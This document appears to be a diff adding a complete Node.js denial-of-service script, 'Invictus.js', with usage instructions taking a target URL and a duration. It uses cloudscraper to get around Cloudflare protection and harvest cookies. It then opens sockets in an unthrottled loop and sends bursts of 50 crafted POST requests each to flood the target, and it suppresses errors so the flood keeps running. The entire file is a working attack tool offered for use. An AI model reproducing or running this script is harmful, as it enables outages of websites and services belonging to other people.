@@ -1,0 +1,59 @@
+
+	1.	const EventEmitter = require('events');
+	2.	const emitter = new EventEmitter();
+	3.	emitter.setMaxListeners(Number.POSITIVE_INFINITY);
+	4.	 
+	5.	var cloudscraper = require('cloudscraper');
+	6.	const url = require('url');
+	7.	if (process.argv.length <= 2) {
+	8.	    console.log("Usage: node Invictus.js <url> <time>");
+	9.	    console.log("Usage: node Invictus.js <http://example.com> <60>");
+	10.	    process.exit(-1);
+	11.	}
+	12.	var target = process.argv[2];
+	13.	var time = process.argv[3];
+	14.	var cookie = "";
+	15.	var ua = "";
+	16.	var host = url.parse(target).host;
+	17.	var cookie = "";
+	18.	cloudscraper.get(target, function (error, response) {
+	19.	    if (error) {
+	20.	    } else {
+	21.	        var parsed = JSON.parse(JSON.stringify(response));
+	22.	        cookie = (parsed["request"]["headers"]["cookie"]);
+	23.	        if (cookie == undefined) {
+	24.	            cookie = (parsed["headers"]["set-cookie"]);
+	25.	        }
+	26.	        ua = (parsed["request"]["headers"]["User-Agent"]);
+	27.	    }
+	28.	    console.log('Received tokens!')
+	29.	    console.log(cookie + '/' + ua);
+	30.	});
+	31.	var counter = 0;
+	32.	 
+	33.	var int = setInterval(() => {
+	34.	    if (cookie !== '' && ua !== '') {
+	35.	        var s = require('net').Socket();
+	36.	        s.connect(443, host);
+	37.	        s.setTimeout(10000);
+	38.	        for (var i = 0; i < 50; i++) {
+	39.	            s.write('POST ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\nName=Gareth+Wylie&Age=24&Formula=a+%2B+b+%3D%3D+13%25%21\r\n\r\n');
+	40.	        }
+	41.	        s.on('data', function () {
+	42.	            setTimeout(function () {
+	43.	                s.destroy();
+	44.	                return delete s;
+	45.	            }, 500);
+	46.	        })
+	47.	    }
+	48.	});
+	49.	setTimeout(() => clearInterval(int), time * 1000);
+	50.	 
+	51.	// to not crash on errors
+	52.	process.on('uncaughtException', function (err) {
+	53.	    console.log(err);
+	54.	});
+	55.	 
+	56.	process.on('unhandledRejection', function (err) {
+	57.	    console.log(err);
+	58.	});
